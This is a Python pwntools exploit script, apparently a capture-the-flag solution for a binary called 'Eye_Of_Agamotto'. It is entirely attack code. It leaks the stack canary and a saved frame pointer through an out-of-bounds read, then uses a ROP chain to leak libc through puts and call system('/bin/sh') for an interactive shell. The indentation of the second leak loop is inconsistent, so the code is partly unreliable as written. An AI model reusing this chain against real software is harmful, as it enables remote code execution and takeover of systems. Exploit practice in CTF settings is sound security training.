from pwn import *
from ctypes import *
from ctypes.util import *
context.log_level = 'debug'

p = process('./Eye_Of_Agamotto')
e = ELF('./Eye_Of_Agamotto')
libc = CDLL(find_library('c'))
libc.srand(0x12983476)
leak = ''
prdi = 0x0000000000400d13
for i in range(105, 112):
	p.recvuntil('Input Name')
	p.sendline("a" * 1)
	p.recvuntil("a" * 1)
	p.recvuntil('Input Number')	
	p.sendline(str(i))
	p.recv(1)
	temp = ord(p.recv(1))
	leak = hex(temp)[2:] + leak
	p.recvuntil('>')
	p.sendline('2')

canary = int(leak + '00',16)	
success(hex(canary))

p.recvuntil("Input Name")
p.sendline("aa")
p.recvuntil("Input Number")
p.sendline("12")

p.recvuntil('>')
p.sendline('2')
leak = ''
for i in range(112, 120):
	p.recvuntil("Input Name")
	p.sendline("a")
	p.recvuntil("Input Number")
	p.sendline(str(i))
	p.recv(1)
        temp = ord(p.recv(1))
        leak = hex(temp)[2:] + leak
        print(leak)     
        p.recvuntil('>')
        p.sendline('2')

rbp = int('00' +leak,16) - 144 + 0x70
success(hex(rbp))

p.recvuntil("Input Name")
p.sendline("aa")
p.recvuntil("Input Number")
p.sendline("12")

p.recvuntil('>')
p.sendline('3')
p.recvuntil('Who you want')
p.sendline(p64(rbp-32))

p.recvuntil('>')
p.sendline('1')
p.recvuntil('Input check')
p.sendline('933350607')
p.recvuntil('>')

pay = "a" * 24
pay += p64(canary)
pay += "b" * 8
pay += p64(prdi)
pay += p64(e.got['puts'])
pay += p64(e.plt['puts'])
pay += p64(e.symbols['input'])

p.sendline(pay)
p.recvuntil('a' * 24)
libc_base = u64(p.recv(6) + '\x00\x00')
success(hex(libc_base))

libc_base = libc_base - 0x06f6a0
system = libc_base + 0x0453a0
binsh = libc_base + 0x18ce17

p.recvuntil('Input check')
p.sendline('1977505122')
p.recvuntil('>')

pay = "a" * (8*7)
pay += p64(canary)
pay += "b" * 8
pay += p64(prdi)
pay += p64(binsh)
pay += p64(system)

p.sendline(pay)

p.interactive()
